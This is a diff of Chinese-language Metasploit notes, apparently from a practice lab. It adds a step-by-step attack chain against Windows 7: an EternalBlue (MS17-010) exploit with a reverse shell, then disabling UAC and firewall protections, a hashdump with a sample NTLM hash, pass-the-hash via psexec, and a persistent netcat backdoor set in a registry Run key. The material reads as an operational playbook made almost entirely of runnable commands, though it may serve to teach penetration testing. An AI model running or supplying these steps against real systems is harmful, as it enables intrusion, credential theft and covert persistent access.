@@ -6,7 +6,7 @@ jobs -K 停止所有
 search name:mysql type:exploit
 search platform:mysql   ‍‍缩小查询范围‍‍
 
-mysql扫描空密码
+	@mysql扫描空密码@
 search mysql_login
 use auxiliary/scanner/mysql/mysql_login 
 show options 
@@ -15,14 +15,14 @@ set BlANK_PASSWORDS true
 set rhosts 192.168.100.140
 run
 
-ssh信息收集
+	@ssh信息收集@
 search ssh_version
 use auxiliary/scanner/ssh/ssh_version
 options
 set rhosts 192.168.100.140
 run
 
-利用win7系统的IE浏览器漏洞获取shell
+	@利用win7系统的IE浏览器漏洞获取shell@
 use exploit/windows/browser/ms14_064_ole_code_execution
 set payload windows/meterpreter/reverse_tcp 
 set lhost 192.168.100.143
@@ -31,14 +31,69 @@ options
 set target 1
 run
 
-使用java7模块getshell
+	@使用java7模块getshell@
 use exploit/multi/browser/java_jre17_driver_manager
 set payload java/meterpreter/reverse_tcp 
 set lhost 192.168.100.143
 set LPORT 4444
 run
 
+	@使用ms17-010漏洞对win7进行@
+Win7防火墙状态关闭   进行扫描确认是否存在漏洞
+use auxiliary/scanner/smb/smb_ms17_010
+set rhosts 192.168.100.129
+run
 
+存在MS17-010漏洞下面开始漏洞利用
+use exploit/windows/smb/ms17_010_eternalblue
+set rhosts 192.168.100.129
+set payload windows/meterpreter/reverse_tcp 
+options
+run
+
+查看权限 meterpreter > getuid
+
+	@创建一个新用户来远程连接win7桌面@
+meterpreter > run post/windows/manage/enable_rdp
+meterpreter > run post/windows/manage/enable_rdp USERNAME=xiaoxiao PASSWORD=123456
+
+sudo rdesktop 192.168.100.129       
+
+	@关闭主机防护策略@
+shell
+	netsh firewall add portopening TCP 4444 "xiaoxiao" ENABLE ALL   
+		创建一条防火墙规则允许4444端口访问网络
+	cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+		ADD添加一个注册表项 -v创建键值 -t 键值类型 -d 键值的值  关闭UAC(通知用户是否对应用程序使用硬盘驱动器和系统文件授权)
+	cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+		开启win7系统主机的默认共享
+
+	@使用hash值登录系统@
+meterpreter > hashdump
+	xiaoxiao:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
+
+use exploit/windows/smb/psexec
+set payload windows/meterpreter/reverse_tcp
+set rhosts 192.168.100.129
+set lhost 192.168.100.143
+set SMBUser xiaoxiao
+set SMBPass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
+set SMBDomain WORKGROUP   //局域网中SMBDomain都是WORKGROUP如果是域用户需要配置域名称。
+run
+
+	@配置一个后门程序,上传nc到Win7@
+meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
+meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe'
+	注册表添加启动项执行nc反弹shell命令   -L 表示用户退出连接后重新进行端口侦听 -d 后台运行 -p 指定端口 -e prog 程序重定向，一旦连接，就执行
+shutdown -r -f -t 0
+	重启生效 -r 重启 -f 强制 -t 时间 0表示立刻
+
+win7	
+	netstat -an
+		TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
+		
+msf6 > connect 192.168.1.56 443
+nc -v 192.168.1.56 443
 
 
 
